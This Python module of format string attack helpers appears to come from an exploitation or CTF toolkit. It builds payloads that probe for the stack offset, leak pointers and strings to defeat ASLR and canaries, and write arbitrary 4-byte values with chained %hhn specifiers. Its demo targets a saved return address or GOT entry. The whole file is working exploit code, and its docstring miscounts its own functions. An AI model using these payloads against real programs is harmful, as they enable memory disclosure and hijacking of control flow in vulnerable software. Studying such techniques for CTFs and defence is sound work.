#!/usr/bin/env python3
"""
format_string.py — Format string attack helpers (leak with %x/%p, write with %n).

Two capabilities:
  find_offset()   : locate WHICH positional arg your buffer occupies.
  leak()          : read memory (ASLR bypass, canary leak).
  write_value()   : overwrite a 4-byte value at target addr via byte-wise %hhn.

Companion: 00-methodology/format-string-playbook.md
"""
import struct

def p32(a): return struct.pack("<I", a)


def find_offset_probe(max_args: int = 40) -> bytes:
    """
    Send this, then look for 41414141 in the output. Its %N$x position N is your offset.
    """
    marker = b"AAAA"
    specs = b".".join(f"%{i}$x".encode() for i in range(1, max_args + 1))
    return marker + b"|" + specs


def leak_pointer(offset: int) -> bytes:
    """Read the pointer sitting at positional `offset` (as hex text)."""
    return f"%{offset}$p".encode()


def leak_string(target_addr: int, offset: int) -> bytes:
    """
    Treat memory at target_addr as a char* and dump it (%s). Your address must land on
    the arg boundary at `offset`. Front-pad so alignment is exact.
    """
    return p32(target_addr) + f"%{offset}$s".encode()


def write_value(target_addr: int, value: int, offset: int) -> bytes:
    """
    Write a full 4-byte `value` to `target_addr` using four 1-byte %hhn writes.
    We place four addresses (addr+0..+3), then print padding to reach each byte value
    in ascending order and fire %hhn at the matching positional arg.

    NOTE: this is a canonical construction; you MUST verify offsets/alignment in the
    debugger for your specific target. The 4 address DWORDs occupy positional args
    offset..offset+3.
    """
    addrs = b"".join(p32(target_addr + i) for i in range(4))
    target_bytes = [(value >> (8 * i)) & 0xff for i in range(4)]  # little-endian bytes

    # Order the four writes by ascending byte value (printed count only grows).
    order = sorted(range(4), key=lambda i: target_bytes[i])

    written = len(addrs)   # chars already emitted (the 4 addresses count!)
    fmt = b""
    for i in order:
        need = target_bytes[i]
        pad = (need - (written % 256)) % 256
        if pad:
            fmt += f"%{pad}c".encode()
            written += pad
        # positional arg for addr+i is offset + i
        fmt += f"%{offset + i}$hhn".encode()
    return addrs + fmt


if __name__ == "__main__":
    print("[offset probe]", find_offset_probe(10))
    print("[leak %8$p ]", leak_pointer(8))
    # overwrite a saved return / GOT entry at 0x00404030 with 0xdeadbeef at arg offset 8:
    print("[write demo]", write_value(0x00404030, 0xdeadbeef, 8))
